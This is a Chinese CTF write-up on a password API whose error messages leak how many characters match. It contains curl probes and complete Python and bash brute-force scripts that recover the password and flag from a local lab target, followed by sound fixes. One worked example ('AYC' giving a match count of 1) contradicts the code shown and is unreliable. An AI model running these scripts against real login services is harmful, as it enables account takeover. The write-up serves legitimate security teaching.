# A10-ExceptionHandling Hard - WriteUP

## 题目分析

本题是一个密码验证系统，核心漏洞在于**异常处理不当导致的信息侧信道泄露**。密码验证函数在密码不匹配时，将匹配前缀的长度信息放入异常消息中返回给客户端。攻击者可以利用这个侧信道信息，逐字节（或逐个字符）爆破出完整密码。

### 漏洞点

```python
def verify_password(pwd):
    if pwd == CORRECT_PASSWORD:
        return True
    
    # ❌ 侧信道泄露：计算匹配前缀长度并放入异常消息
    match_len = sum(1 for a, b in zip(pwd, CORRECT_PASSWORD) if a == b)
    raise InvalidPassword(f"Password incorrect. Matched {match_len} chars.")
```

这里的 `match_len` 使用了逐位置比较的累加方式：

```python
sum(1 for a, b in zip(pwd, correct) if a == b)
```

这个逻辑比较特殊：它会比较两个字符串对应位置的字符，但**不是前缀匹配**。例如：
- 如果正确密码是 `ABC`，输入 `XBC`，`match_len = 2`（B和C匹配）
- 如果正确密码是 `ABC`，输入 `AYC`，`match_len = 1`（只有C匹配）

但是！如果我们采用**逐字节增长**的策略，就可以利用这个信息确认每个位置的字符。

### 侧信道攻击原理

正确的攻击策略是**逐位确定**：

1. 假设我们已确定密码前 `n` 个字符为 `prefix`
2. 尝试 `prefix + c`（c为每个可能的字符）
3. 如果 `match_len > n`，说明新添加的字符 `c` 是正确的
4. 继续确定下一个字符

为什么这个方法有效？
- 当我们输入 `prefix + c` 且 `prefix` 全部正确时，`match_len` 至少为 `len(prefix)`
- 如果 `c` 也是正确的，`match_len` 就会等于 `len(prefix) + 1`
- 如果 `c` 是错误的，`match_len` 就会等于 `len(prefix)`（因为只有前缀匹配）

## 解题步骤

### 第一步：观察API行为

```bash
# 测试一个明显错误的密码
curl -X POST "http://target/api/verify" \
  -H "Content-Type: application/json" \
  -d '{"password": "wrong"}'
```

返回：
```json
{
  "success": false,
  "error": "Password incorrect. Matched 0 chars."
}
```

### 第二步：确认第一个字符

尝试不同的第一个字符，寻找 `Matched 1 chars` 的情况：

```bash
curl -X POST "http://target/api/verify" -H "Content-Type: application/json" -d '{"password": "A"}'
# Matched 0 chars.

curl -X POST "http://target/api/verify" -H "Content-Type: application/json" -d '{"password": "S"}'
# Matched 1 chars.
```

第一个字符是 `S`。

### 第三步：继续爆破后续字符

```bash
# 第二个字符
curl -X POST "http://target/api/verify" -H "Content-Type: application/json" -d '{"password": "S0"}'
# Matched 1 chars.

curl -X POST "http://target/api/verify" -H "Content-Type: application/json" -d '{"password": "S3"}'
# Matched 2 chars.
```

第二个字符是 `3`。

依此类推，直到获取完整密码。

### 第四步：获取flag

当密码正确时，系统返回flag：

```bash
curl -X POST "http://target/api/verify" \
  -H "Content-Type: application/json" \
  -d '{"password": "S3cr3tP@ssw0rd123"}'
```

返回：
```json
{
  "success": true,
  "message": "验证通过！",
  "flag": "flag{...}"
}
```

## 完整自动化盲注脚本

```python
#!/usr/bin/env python3
"""
A10 Hard - 异常侧信道盲注脚本
利用密码验证异常中泄露的匹配长度信息，逐字节爆破密码。
"""

import requests
import string
import sys

TARGET = "http://localhost:8082"
API_URL = f"{TARGET}/api/verify"

# 字符集：包含所有可能的ASCII可打印字符
# 可以根据需要缩小范围
CHARSET = string.ascii_letters + string.digits + string.punctuation + ' '
# 更精确的字符集（如果知道密码只包含特定字符）
# CHARSET = string.ascii_letters + string.digits + '@!#$%^&*()_+-=[]{}|;:,.<>?'


def check_password(pwd: str) -> int:
    """
    提交密码，返回匹配长度。
    如果密码正确，返回 -1 表示成功。
    """
    try:
        r = requests.post(
            API_URL,
            json={"password": pwd},
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        data = r.json()
        
        if data.get("success"):
            print(f"\n[+] 密码正确: {pwd}")
            print(f"[+] FLAG: {data.get('flag')}")
            return -1
        
        error_msg = data.get("error", "")
        # 解析 "Matched X chars."
        if "Matched" in error_msg:
            matched = int(error_msg.split("Matched ")[1].split(" ")[0])
            return matched
        else:
            print(f"[!] 意外的错误信息: {error_msg}")
            return 0
    except Exception as e:
        print(f"[!] 请求异常: {e}")
        return 0


def blind_inject(max_length=32):
    """
    逐字节盲注密码。
    策略：从已知前缀开始，逐个尝试字符，寻找使匹配长度增加1的字符。
    """
    password = ""
    
    print(f"[*] 开始盲注，字符集大小: {len(CHARSET)}")
    
    for pos in range(max_length):
        found = False
        
        for char in CHARSET:
            guess = password + char
            matched = check_password(guess)
            
            if matched == -1:
                # 密码完全正确
                return password + char
            
            if matched > pos:
                # 匹配长度增加了，说明这个字符是正确的
                password += char
                found = True
                print(f"[+] 位置 {pos}: '{char}' -> 当前密码: {password}")
                break
        
        if not found:
            print(f"[-] 未找到位置 {pos} 的字符，可能已达密码末尾")
            # 验证当前密码是否就是完整密码
            if check_password(password) == -1:
                return password
            break
    
    return password


def optimized_blind_inject():
    """
    优化的盲注：利用匹配长度信息减少尝试次数。
    如果匹配长度大于当前前缀长度，说明新字符正确。
    """
    password = ""
    print(f"[*] 开始优化盲注...")
    
    while True:
        pos = len(password)
        found = False
        
        for char in CHARSET:
            guess = password + char
            matched = check_password(guess)
            
            if matched == -1:
                print(f"\n[+] 完整密码: {guess}")
                return guess
            
            # 如果匹配长度等于 guess 的长度，说明 guess 全部正确
            if matched == len(guess):
                password = guess
                found = True
                sys.stdout.write(f"\r[+] 当前进度: {password}")
                sys.stdout.flush()
                break
        
        if not found:
            print(f"\n[-] 未找到下一个字符，密码可能为: {password}")
            break
    
    return password


if __name__ == "__main__":
    print("=" * 60)
    print("A10 Hard - 异常侧信道密码盲注")
    print("=" * 60)
    
    # 使用优化版本
    result = optimized_blind_inject()
    
    print(f"\n[*] 盲注完成。密码: {result}")
```

### 使用curl的bash盲注脚本

```bash
#!/bin/bash
# 简化版bash盲注脚本（使用POST JSON避免URL编码问题）

TARGET="http://localhost:8082"
CHARSET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
PASSWORD=""

for pos in $(seq 0 30); do
    FOUND=0
    for char in $(echo "$CHARSET" | fold -w1); do
        GUESS="${PASSWORD}${char}"
        RESPONSE=$(curl -s -X POST "${TARGET}/api/verify" \
            -H "Content-Type: application/json" \
            -d "{\"password\":\"${GUESS}\"}")
        
        if echo "$RESPONSE" | grep -q '"success": true'; then
            echo "找到密码: $GUESS"
            echo "Flag: $(echo $RESPONSE | grep -o 'flag{[^}]*}')"
            exit 0
        fi
        
        MATCHED=$(echo "$RESPONSE" | grep -oP 'Matched \K\d+')
        if [ "$MATCHED" -gt "$pos" ]; then
            PASSWORD="$GUESS"
            echo "位置 $pos: $char -> $PASSWORD"
            FOUND=1
            break
        fi
    done
    
    if [ "$FOUND" -eq 0 ]; then
        echo "未找到更多字符，结束。"
        break
    fi
done
```

## 扩展思考

### 为什么这是侧信道攻击？

传统的安全模型认为："只要密码不正确，就拒绝访问，不泄露任何信息"。但本题中，即使密码错误，系统也通过异常消息泄露了**部分匹配信息**。这属于**时序/信息侧信道攻击**的一种变体。

类似的侧信道包括：
- **时序侧信道**：比较密码时，正确前缀比较时间更长
- **错误消息侧信道**：用户名存在 vs 不存在时错误消息不同（用户枚举）
- **异常类型侧信道**：不同错误抛出不同类型异常

### 字符集优化

如果字符集很大（95个可打印ASCII字符），盲注一个18位密码需要约 18 × 95 = 1710 次请求，仍然非常快速。

可以通过以下方式进一步优化：
1. **频率分析**：优先尝试常见字符（字母、数字）
2. **熵减少**：如果知道密码策略（如必须包含大小写字母、数字、特殊符号），可以缩小范围
3. **并发请求**：同时测试多个字符（如果服务器不限制速率）

## 修复建议

### 1. 异常信息最小化原则

```python
class InvalidPassword(Exception):
    pass

def verify_password(pwd):
    if pwd == CORRECT_PASSWORD:
        return True
    # ✅ 不再泄露任何匹配信息
    raise InvalidPassword("Password incorrect.")
```

### 2. 使用安全的字符串比较函数

```python
import hmac

def verify_password_secure(pwd):
    # ✅ 使用恒定时间比较，防止时序攻击
    if hmac.compare_digest(pwd, CORRECT_PASSWORD):
        return True
    raise InvalidPassword("Password incorrect.")
```

### 3. 增加速率限制和账户锁定

```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route('/api/verify', methods=['POST'])
@limiter.limit("5 per minute")
def api_verify():
    # ...
```

### 4. 日志记录异常但不泄露给客户端

```python
@app.errorhandler(InvalidPassword)
def handle_invalid_password(e):
    # 记录详细错误到服务器日志
    app.logger.warning(f"Failed login attempt: {e}")
    # 只返回通用错误给客户端
    return jsonify({"error": "Authentication failed"}), 401
```

### 5. 使用哈希和盐存储密码

```python
import bcrypt

# 存储时使用bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())

# 验证时使用恒定时间比较
if bcrypt.checkpw(input_password.encode(), stored_hash):
    # 验证通过
```

## 相关OWASP链接

- [OWASP Top 10 2025 - A10: Mishandling of Exceptional Conditions](https://owasp.org/Top10/A10_2025-Mishandling_of_Exceptional_Conditions/)
- [CWE-209: Information Exposure Through an Error Message](https://cwe.mitre.org/data/definitions/209.html)
- [CWE-203: Observable Discrepancy](https://cwe.mitre.org/data/definitions/203.html)（侧信道基础）
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
